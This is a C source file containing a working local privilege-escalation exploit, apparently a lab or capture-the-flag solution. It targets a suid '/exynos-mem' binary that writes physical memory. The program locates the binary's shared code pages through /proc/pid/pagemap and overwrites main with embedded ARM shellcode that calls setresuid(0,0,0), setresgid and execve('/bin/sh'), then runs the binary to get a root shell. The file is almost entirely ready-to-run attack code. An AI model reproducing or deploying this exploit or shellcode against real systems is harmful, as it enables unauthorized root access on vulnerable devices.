// we can exploit the physical memory write purely in usermode by overwriting the suid binary's code. since the code pages are shared with COW,
// it suffices to find the physical address in one process. this can be done by running the binary in non suid mode (via `prctl(PR_SET_NO_NEW_PRIVS, 1)`)
// and parsing the pagemap file of the unprivileged process to find the physical address of the COW code pages.
#define _XOPEN_SOURCE 700
#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <signal.h>
#include <sys/types.h>
#include <stdint.h>

#define READ 0
#define WRITE 1

#define MAIN_OFFSET 0xd0c
#define SHELLCODE "\x00\x00 \xe0\x01\x10!\xe0\x02 \"\xe0\xa4p\xa0\xe3\x00\x00\x00\xef\x00\x00 \xe0\x01\x10!\xe0\x02 \"\xe0\xaap\xa0\xe3\x00\x00\x00\xefhp\x00\xe3\x41qD\xe3\x04p-\xe5/\x7f\x02\xe3/sG\xe3\x04p-\xe5/r\x06\xe3i~F\xe3\x04p-\xe5\r\x00\xa0\xe1sx\x06\xe3\x04p-\xe5\x0c\xc0,\xe0\x04\xc0-\xe5\x04\x10\xa0\xe3\r\x10\x81\xe0\x01\xc0\xa0\xe1\x04\xc0-\xe5\r\x10\xa0\xe1\x02 \"\xe0\x0bp\xa0\xe3\x00\x00\x00\xef" // setresuid(0,0,0); setresgid(0.0.0); execve("/bin/sh")

// prctl definition
#define PR_SET_NO_NEW_PRIVS 38

int prctl(int cmd, int arg)
{
    syscall(__NR_prctl, cmd, arg, 0, 0, 0);
}

// pagemap parsing
typedef struct
{
    uint64_t pfn : 55;
    unsigned int soft_dirty : 1;
    unsigned int file_page : 1;
    unsigned int swapped : 1;
    unsigned int present : 1;
} pagemap_entry_t;

int pagemap_get_entry(pagemap_entry_t *entry, int pagemap_fd, uintptr_t vaddr)
{
    size_t nread;
    ssize_t ret;
    uint64_t data;
    uintptr_t vpn;

    vpn = vaddr / sysconf(_SC_PAGE_SIZE);
    nread = 0;
    while (nread < sizeof(data))
    {
        ret = pread(pagemap_fd, ((uint8_t *)&data) + nread, sizeof(data) - nread,
                    vpn * sizeof(data) + nread);
        nread += ret;
        if (ret <= 0)
        {
            return 1;
        }
    }
    entry->pfn = data & (((uint64_t)1 << 55) - 1);
    entry->soft_dirty = (data >> 55) & 1;
    entry->file_page = (data >> 61) & 1;
    entry->swapped = (data >> 62) & 1;
    entry->present = (data >> 63) & 1;
    return 0;
}

int virt_to_phys_user(uintptr_t *paddr, pid_t pid, uintptr_t vaddr)
{
    char pagemap_file[BUFSIZ];
    int pagemap_fd;

    snprintf(pagemap_file, sizeof(pagemap_file), "/proc/%ju/pagemap", (uintmax_t)pid);
    pagemap_fd = open(pagemap_file, O_RDONLY);
    if (pagemap_fd < 0)
    {
        return -1;
    }
    pagemap_entry_t entry;
    if (pagemap_get_entry(&entry, pagemap_fd, vaddr))
    {
        return -2;
    }
    close(pagemap_fd);
    *paddr = (entry.pfn * sysconf(_SC_PAGE_SIZE)) + (vaddr % sysconf(_SC_PAGE_SIZE));
    return 0;
}

pid_t run_unprivileged()
{
    pid_t pid = fork();
    if (pid == -1)
    {
        perror("fork");
        return -1;
    }

    if (pid == 0)
    {
        // child
        prctl(PR_SET_NO_NEW_PRIVS, 1);
        execl("/exynos-mem", "/exynos-mem", "0", "1024", "1", NULL);
    }
    else
    {
        return pid;
    }
}

int write_phys(uintptr_t addr, char *data, size_t length)
{
    char command[256];
    sprintf(command, "/exynos-mem %ji %zi %d", (uintmax_t)addr, length, WRITE);
    FILE *cmd_stdin = popen(command, "w");

    int err = fwrite(data, 1, length, cmd_stdin);
    pclose(cmd_stdin);

    return err;
}

int main(int argc, char const *argv[])
{
    int err = 0;
    pid_t target = run_unprivileged();

    puts("[*] waiting for child to run");
    usleep(200);

    uintptr_t phys = 0;

    if ((err = virt_to_phys_user(&phys, target, 0x8000)) < 0)
    {
        printf("virt_to_phys_user: %d\n", err);
    }

    printf("[v] found main address: 0x%jx\n", (uintmax_t)phys);
    puts("[*] overwriting with shellcode");

    uintptr_t phys_main = phys + MAIN_OFFSET;
    write_phys(phys_main, SHELLCODE, sizeof(SHELLCODE));

    // kill old process (so that it wont interfere with the input)
    kill(target, SIGKILL);

    puts("[v] spawning shell");
    execl("/exynos-mem", NULL);

    return 0;
}
